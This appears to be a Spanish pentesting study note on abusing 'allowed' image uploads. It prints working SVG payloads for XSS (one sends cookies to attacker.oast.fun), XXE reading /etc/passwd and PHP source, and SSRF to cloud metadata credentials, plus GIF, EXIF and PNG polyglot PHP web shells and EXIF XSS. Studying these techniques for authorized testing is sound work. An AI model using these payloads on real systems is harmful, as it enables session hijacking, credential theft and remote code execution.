---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - File-Upload
Descripción: "No siempre logramos un upload arbitrario"
Fecha de actualización: 2026-06-21
Nota previa: "[[05 - Validación de tipo - Content-Type y magic bytes]]"
Nota siguiente: "[[07 - Vectores avanzados - procesamiento, ZIP Slip y race conditions]]"
Area: "[[File Upload.base|File Upload]]"
---
---

No siempre logramos un upload arbitrario. Cuando el filtro es sólido y <mark style="background: #ADCCFFA6;">solo admite un tipo concreto —típicamente imágenes—, el fichero "permitido" sigue siendo un arma</mark>. Un `SVG` transporta XSS, XXE o SSRF; una imagen real con código incrustado (un *polyglot*) supera la validación de contenido; los metadatos EXIF llevan payloads. <mark style="background: #FFB86CA6;">En aplicaciones modernas que sirven los uploads desde un bucket sin intérprete, estos vectores —no el `.php` directo— son a menudo el único camino real.</mark> Por eso fuzzear qué extensiones se aceptan no es opcional: define el arsenal disponible.

# SVG: el vector más versátil

<mark style="background: #ADCCFFA6;">Un SVG es XML que el navegador renderiza como gráfico</mark>, así que hereda toda la superficie de ataque del XML y del DOM. Suele colarse porque es "una imagen".

**Stored XSS.** Si el SVG se sirve con `Content-Type: image/svg+xml` y se abre directo (o embebido en `<object>`/`<iframe>`), su JavaScript ejecuta en el origen de la aplicación:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.oast.fun/?c='+document.cookie)</script>
</svg>
```

Si un sanitizador filtra `<script>`, quedan los event handlers y `foreignObject`:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" onmouseover="alert(document.domain)"/>
  <foreignObject><body xmlns="http://www.w3.org/1999/xhtml">
    <script>alert(document.domain)</script>
  </body></foreignObject>
</svg>
```

> [!warning]+ El XSS por SVG tiene requisitos
> No ejecuta dentro de `<img src=x.svg>`. Necesita que el servidor lo devuelva como `image/svg+xml` (no `text/plain`) y **sin** `Content-Disposition: attachment`, y que la víctima lo abra directamente o vía `<object>`/`<iframe>`. Es un patrón muy vivo en bug bounty 2024 (p. ej. el [SVG stored XSS de LY/LINE, HackerOne #3008878](https://hackerone.com/reports/3008878)). Más sobre el vector en [[01 - XSS Almacenado|XSS almacenado]].

**XXE.** Si el SVG se **procesa en el servidor** (generación de thumbnails, exportación a PDF con librsvg/ImageMagick) y el parser XML admite entidades externas, leemos ficheros:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="30">&xxe;</text></svg>
```

<mark style="background: #FF5582A6;">Leer el código fuente de la app es más valioso que `/etc/passwd`</mark>: revela el directorio de uploads, las extensiones permitidas y el esquema de nombres. En PHP, vía wrapper:

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

**SSRF.** El atributo `href` (SVG 2) —o `xlink:href` (SVG 1.1)— en `<image>`/`<use>` fuerza una petición saliente del servidor al renderizar; conviene poner **ambos**, porque los renderers modernos (librsvg ≥ 2.52) ya ignoran `xlink:href` solo. <mark style="background: #FFB86CA6;">El objetivo jugoso es el endpoint de metadatos cloud</mark>:

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
         xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
         width="200" height="200"/>
</svg>
```

El detalle de XXE y SSRF se trata en sus propios sub-temas ([[01 - Introducción a SSRF|SSRF]] y XXE en Web Attacks); aquí basta saber que **el upload es el vehículo de entrega**.

**DoS (billion laughs).** Entidades XML recursivas expanden ~1 KB a gigabytes de memoria, tumbando el proceso que parsea el SVG (afecta a optimizadores como SVGO en pipelines de imagen). Mismo patrón que el [XXE de denegación de servicio](https://github.com/allanlw/svg-cheatsheet).

# Polyglots: imagen válida + código

Contra la [[05 - Validación de tipo - Content-Type y magic bytes|validación de contenido]] dura (`getimagesize`, `finfo`, re-procesado) no basta un `GIF8` suelto: hace falta un fichero que sea **imagen válida de verdad** *y* contenga el payload.

- **GIF/PHP** (el más simple): `GIF89a` es cabecera válida y ASCII imprimible.

```shell-session
$ printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

- **JPEG/PHP vía EXIF** (sobrevive a `getimagesize` y `finfo` con una imagen real): se inyecta el código en un campo de metadatos.

```shell-session
$ exiftool -Comment='<?php system($_GET["cmd"]); __halt_compiler(); ?>' real.jpg -o shell.jpg
```

<mark style="background: #8000E1A6;">`__halt_compiler()` corta el parseo de PHP tras el payload, evitando que los bytes binarios de la imagen generen errores.</mark>

- **PHAR/JPEG** (POST-2019): un fichero que es JPEG válido *y* archivo PHAR con una *gadget chain* serializada. Generado con [`phpggc --phar-jpeg`](https://github.com/ambionics/phpggc), dispara **deserialización** cuando cualquier función de fichero recibe la ruta con el wrapper `phar://`. La deserialización **automática** vía funciones de fichero se desactivó en PHP 8.0 (en 8.0+ solo queda la ruta explícita `Phar::getMetadata()`). Enlaza con la futura nota de [[Deserialización PHP|deserialización]].

El polyglot pasa la validación porque empieza con una imagen estructuralmente correcta; **ejecuta** si después conseguimos que se sirva como `.php` (vía [[03 - Bypass de blacklist de extensiones|.htaccess]] o doble extensión) o que se invoque por `phar://`.

> [!success]+ El polyglot que sobrevive al *resize*
> Si el servidor **redimensiona** la imagen (GD, ImageMagick) antes de guardarla, destruye los payloads en EXIF, comentarios y *chunks* ancilares —reconstruye la imagen desde los píxeles—. <mark style="background: #FF5582A6;">El único payload que sobrevive a un resize es el inyectado en el chunk `IDAT` de un PNG</mark> (los datos de píxel reales). Un PNG 110×110 con `<?=$_GET[0]($_POST[1]);?>` en su IDAT persiste tras escalarse a 55×55 ([Synacktiv](https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)).

# Metadatos EXIF como vector independiente

Aun sin ejecución, los metadatos atacan si la app los **muestra**. Una galería que renderiza el campo `Artist` o `Comment` sin sanitizar es XSS almacenado:

```shell-session
$ exiftool -Artist='"><script>alert(document.domain)</script>' photo.jpg
```

# Qué vector según el caso

| Vector | Requisito | Impacto |
| - | - | - |
| SVG → XSS | Servido como `image/svg+xml`, abierto directo | Robo de sesión, acciones como víctima |
| SVG → XXE | Render server-side, parser XML inseguro | Lectura de ficheros / código fuente |
| SVG → SSRF | Render server-side con fetch de `href` | Metadata cloud, pivote interno |
| Polyglot imagen+PHP | Validación por contenido + ejecución posterior | RCE |
| EXIF injection | Metadatos reflejados o ejecución | XSS / RCE |

> [!info]+ Fuentes
> - [PortSwigger — File upload vulnerabilities](https://portswigger.net/web-security/file-upload) (validación de contenido, polyglots)
> - [PayloadsAllTheThings — Upload Insecure Files](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/) (polyglots, EXIF, payloads SVG)
> - [allanlw — SVG cheatsheet](https://github.com/allanlw/svg-cheatsheet) (XSS, XXE, SSRF, billion laughs)
> - [Synacktiv — Persistent PHP payloads in PNGs (IDAT)](https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there) · [HackerOne #3008878 — SVG stored XSS (2024)](https://hackerone.com/reports/3008878)

Hasta aquí, vectores que metemos *dentro* de un fichero permitido. El otro frente moderno ataca lo que el servidor *hace* con el fichero —procesarlo, descomprimirlo, nombrarlo—: [[07 - Vectores avanzados - procesamiento, ZIP Slip y race conditions]].
